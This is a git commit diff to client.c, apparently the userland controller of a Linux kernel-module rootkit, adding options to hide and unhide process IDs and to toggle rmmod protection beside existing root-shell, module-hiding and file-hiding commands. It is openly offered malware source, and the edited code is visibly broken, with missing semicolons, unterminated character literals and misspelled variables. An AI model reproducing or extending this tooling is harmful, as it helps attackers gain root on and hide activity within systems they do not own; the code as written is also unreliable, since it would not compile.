b3a05f4f0fb19cf43406b6ec930aa8781745c5ca
Emmanuel <aadewale123@gmail.com>
2019-06-19 22:51:29 -0400

    Another update

--- client.c
+++ client.c
@@ -14,9 +14,9 @@ void printHelp(char **argv){
             "  --root-shell            Grants you root shell access.\n"
             "  --hide-pid=PID          Hides the specified PID.\n"
             "  --unhide-pid=PID        Unhides the specified PID.\n"
-            "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
-            "                          Must be a filename without any path.\n"
-            "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
+//            "  --hide-file=FILENAME    Hides the specified FILENAME globally.\n"
+//            "                          Must be a filename without any path.\n"
+//            "  --unhide-file=FILENAME  Unhides the specified FILENAME.\n"
             "  --hide                  Hides the rootkit LKM.\n"
             "  --unhide                Unhides the rootkit LKM.\n"
             "  --help                  Print this help message.\n"
@@ -24,7 +24,10 @@ void printHelp(char **argv){
             "  --unprotect             Disables the rmmod protection.\n\n", argv[0]);
 }
 
-void handle_command(int argc, char **argv, int *root, int *hide, int *unhide){
+void handle_command(int argc, char **argv, int *root, int *hide_pid,
+                    int *unhide_pid, char **pid,int *hide, int *unhide,
+                    int *protect, int *unprotect){
+
     if (argc < 2) {
         fprintf(stderr, "Error: No arguments provided.\n\n");
         printHelp(argv);
@@ -45,24 +48,43 @@ void handle_command(int argc, char **argv, int *root, int *hide, int *unhide){
 
     // Wooow, what's an option
     static struct option long_options[] ={
-            {"root-shell", no_argument, 0, 'a'},
-            {"hide", no_argument, 0, 'f'},
-            {"unhide", no_argument, 0, 'g'},
-            {0, 0, 0, 0}
+            {"root-shell",  no_argument,       0,    'a'},
+            {"hide-pid",    required_argument, 0,    'b'},
+            {"unhide-pid",  required_argument, 0,    'c'},
+            {"hide",        no_argument,       0,    'f'},
+            {"unhide",      no_argument,       0,    'g'},
+            {"help",        no_argument,       0,    'h'},
+            {"protect",     no_argument,       0,    'i'},
+            {"unprotect",   no_argument,       0,    'j'},
+            {0,             0,                 0,      0}
     };
 
     *root = 0;
+    *hide_pid = 0;
+    *unhide_pid = 0;
+    *pid = NULL
     *hide = 0;
     *unhide = 0;
+    *help = 0;
+    *protect = 0;
+    *unprotect = 0;
 
     int opt;
     while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1){
-        printf("In the helper command: ");
+//        printf("In the helper command: ");
         switch (opt){
             case 'a':
                 *root = 1;
                 printf("Root");
                 break;
+            case 'b:
+                *hide_pid = 1;
+                *pid = optarg;
+                break;
+            case 'c:
+                *unhide_pid = 1;
+                *pid = optarg;
+                break
             case 'f':
                 printf("hide");
                 *hide = 1;
@@ -70,6 +92,15 @@ void handle_command(int argc, char **argv, int *root, int *hide, int *unhide){
             case 'g':
                 printf("unhide");
                 *unhide = 1;
+                break;
+            case 'h':
+                printHelp(argv)
+                exit(0);
+            case 'i':
+                *proctect = 1;
+                break;
+            case 'j':
+                *unproctect = 1;
                 break;
             case '?':
                 fprintf(stderr, "Error: Unrecognised option %s\n\n", argv[optind - 1]);
@@ -105,9 +136,13 @@ void pointer_example(){
 
 int main(int argc, char **argv) {
     int root;
+    int hide_pid;
+    int unhide_pid;
+    char *pid;
     int hide;
     int unhide;
-
+    int protect;
+    int unprotect;
 //    char[10] test = "Iamfive"; // this is 7 characters
 //    size_t size = sizeof(test);
 //    printf("Size is: %zu", size);
@@ -117,7 +152,8 @@ int main(int argc, char **argv) {
 //    printf("\nThe address of hide: %p", &hide);
 //    printf("\nThe address of unhide: %p", &unhide);
 
-    handle_command(argc, argv, &root, &hide, &unhide);
+    handle_command(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
+            &hide, &unhide, &protect, &unprotect);
 
     size_t buf_size = 0;
     printf("\nInitial size_t: %zu", buf_size);
@@ -128,13 +164,22 @@ int main(int argc, char **argv) {
     if (root) {
         buf_size += sizeof(CFG_ROOT);
         printf("\nRoot size: %zu", buf_size);
-    } else if (hide){
-        buf_size += sizeof(CFG_HIDE);
-        printf("\nHide size: %zu", buf_size);
+    } else if(hide_pid) {
+        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
+    }else if(unhide_pid){
+        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
+    }else if (hide){
+            buf_size += sizeof(CFG_HIDE);
+            printf("\nHide size: %zu", buf_size);
     } else if (unhide){
         buf_size += sizeof(CFG_UNHIDE);
         printf("\nUnhide size: %zu", buf_size);
+    } else if (protect) {
+        buf_size += sizeof(CFG_PROTECT);
+    } else if (unprotect) {
+        buf_size += sizeof(CFG_UNPROTECT);
     }
+
 
     buf_size += 1; // for null terminator
     printf("\nBecause of null: %zu", buf_size);
@@ -147,10 +192,20 @@ int main(int argc, char **argv) {
     write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
     if (root){
         write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
+    } else if (hide_pid) {
+        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
+        write_buffer(&buf_ptr, pid, strlen(pid));
+    }else if (unhide_pid) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
+        write_buffer(&buf_ptr, pid, strlen(pid));
     } else if (hide){
         write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
     } else if (unhide){
         write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
+    } else if (protect) {
+        write_buffer(&buf_ptr, CFG_PROCTECT, sizeof(CFG_PROCTECT));
+    } else if (unprotect) {
+        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
     }
 
     if (root) {
